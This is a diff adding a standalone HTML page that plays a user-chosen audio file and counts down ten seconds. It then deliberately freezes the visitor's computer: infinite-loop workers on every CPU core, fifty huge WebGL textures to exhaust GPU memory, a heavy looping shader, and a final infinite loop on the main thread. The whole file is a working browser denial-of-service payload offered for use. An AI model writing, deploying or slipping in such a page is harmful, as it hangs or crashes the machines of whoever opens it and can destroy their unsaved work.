@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Freeze with Custom Audio</title>
+<style>
+  body {
+    background: black;
+    color: white;
+    text-align: center;
+    font-size: 2em;
+    margin-top: 10%;
+  }
+  input {
+    font-size: 1em;
+    margin-top: 20px;
+  }
+</style>
+</head>
+<body>
+  <h1>Select an audio file to play before freeze</h1>
+  <input type="file" id="audioFile" accept="audio/*">
+  <p id="status"></p>
+  <h2 id="countdown" style="display:none;">Freezing in <span id="timer">10</span> seconds</h2>
+  <canvas id="glcanvas"></canvas>
+
+<script>
+let audio;
+document.getElementById("audioFile").addEventListener("change", function(event) {
+  const file = event.target.files[0];
+  if (!file) return;
+
+  const url = URL.createObjectURL(file);
+  audio = new Audio(url);
+  audio.loop = true;
+  audio.play();
+
+  document.getElementById("status").textContent = "Playing your audio...";
+  startCountdown();
+});
+
+function startCountdown() {
+  document.getElementById("countdown").style.display = "block";
+  let countdown = 10;
+  const timerEl = document.getElementById("timer");
+  const interval = setInterval(() => {
+    countdown--;
+    timerEl.textContent = countdown;
+    if (countdown <= 0) {
+      clearInterval(interval);
+      startFreeze();
+    }
+  }, 1000);
+}
+
+function startFreeze() {
+  // CPU load
+  for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+    const workerCode = `while(true){Math.sqrt(Math.random());}`;
+    const blob = new Blob([workerCode], {type: "application/javascript"});
+    const url = URL.createObjectURL(blob);
+    new Worker(url);
+  }
+
+  // GPU setup
+  const canvas = document.getElementById("glcanvas");
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  const gl = canvas.getContext("webgl");
+
+  function bigTexture() {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 8192, 8192, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+  }
+  for (let i = 0; i < 50; i++) bigTexture();
+
+  // Simple shader
+  const vs = gl.createShader(gl.VERTEX_SHADER);
+  gl.shaderSource(vs, `attribute vec4 p;void main(){gl_Position=p;}`);
+  gl.compileShader(vs);
+  const fs = gl.createShader(gl.FRAGMENT_SHADER);
+  gl.shaderSource(fs, `void main(){for(int i=0;i<100000;i++){} gl_FragColor=vec4(1.0,0.0,0.0,1.0);}`);
+  gl.compileShader(fs);
+  const prog = gl.createProgram();
+  gl.attachShader(prog, vs);
+  gl.attachShader(prog, fs);
+  gl.linkProgram(prog);
+  gl.useProgram(prog);
+
+  const verts = new Float32Array([-1,-1, -1,1, 1,-1, 1,1]);
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, verts, gl.STATIC_DRAW);
+  const loc = gl.getAttribLocation(prog, "p");
+  gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+  gl.enableVertexAttribArray(loc);
+
+  // Draw one frame
+  gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+
+  // LOCK main thread
+  while(true) {}
+}
+</script>
+</body>
+</html>
